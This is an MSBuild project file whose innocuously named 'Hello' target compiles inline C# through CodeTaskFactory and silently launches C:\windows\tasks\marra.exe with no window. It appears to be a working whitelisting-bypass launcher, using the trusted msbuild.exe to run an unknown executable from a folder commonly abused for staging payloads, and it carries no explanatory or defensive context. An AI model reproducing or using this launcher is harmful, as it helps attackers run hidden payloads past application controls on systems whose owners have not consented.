<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>

      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {
			public override bool Execute()
			{
				System.Diagnostics.Process p = new System.Diagnostics.Process();
				p.StartInfo.FileName = "C:\\windows\\tasks\\marra.exe";
				p.StartInfo.RedirectStandardOutput = true;
				p.StartInfo.UseShellExecute = false;
				p.StartInfo.CreateNoWindow = true; 
				p.Start();
       			return true;
			}
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
